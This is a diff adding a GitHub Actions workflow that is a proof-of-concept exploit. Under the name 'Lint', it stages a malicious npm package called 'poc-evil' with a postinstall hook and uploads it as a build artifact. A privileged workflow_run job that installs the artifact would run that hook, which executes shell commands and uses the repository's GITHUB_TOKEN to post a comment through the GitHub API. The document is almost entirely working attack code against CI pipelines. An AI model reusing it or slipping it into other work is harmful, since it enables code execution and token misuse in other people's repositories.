@@ -1,0 +1,48 @@
+---
+name: Lint
+on:
+  pull_request:
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: stage attacker controlled artifact payload
+        env:
+          PR: ${{ github.event.pull_request.number }}
+        run: |
+          echo "$PR" > pr-number.txt
+          printf 'fork artifact report\n' > linter-report.txt
+          printf 'allow-scripts=poc-evil\n' > .npmrc
+          mkdir -p poc-evil
+          cat > package.json <<'JSON'
+          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"poc-evil":"file:./poc-evil"}}
+          JSON
+          cat > poc-evil/package.json <<'JSON'
+          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
+          JSON
+          cat > poc-evil/hook.js <<'JS'
+          const fs = require('fs');
+          const cp = require('child_process');
+          const ws = process.env.GITHUB_WORKSPACE;
+          console.log('FORK-RCE-HOOK-RAN uid=' + cp.execSync('id -u').toString().trim() + ' token_present=' + !!process.env.GITHUB_TOKEN);
+          const pr = fs.readFileSync(ws + '/pr-number.txt', 'utf8').trim();
+          const body = JSON.stringify({body: '**POC-FORK-RCE**: postinstall from fork PR artifact executed during privileged workflow_run npm install. token_present=' + !!process.env.GITHUB_TOKEN + ' run=' + process.env.GITHUB_RUN_ID});
+          try {
+            const out = cp.execFileSync('curl', ['-s','-o','/dev/null','-w','%{http_code}','-X','POST',
+              '-H','Authorization: Bearer ' + process.env.GITHUB_TOKEN,
+              '-H','Content-Type: application/json','-d', body,
+              'https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments'], {encoding:'utf8'});
+            console.log('hook comment status=' + out);
+          } catch (e) { console.log('hook err ' + e.message); }
+          JS
+      - uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          include-hidden-files: true
+          path: |
+            pr-number.txt
+            linter-report.txt
+            .npmrc
+            package.json
+            poc-evil
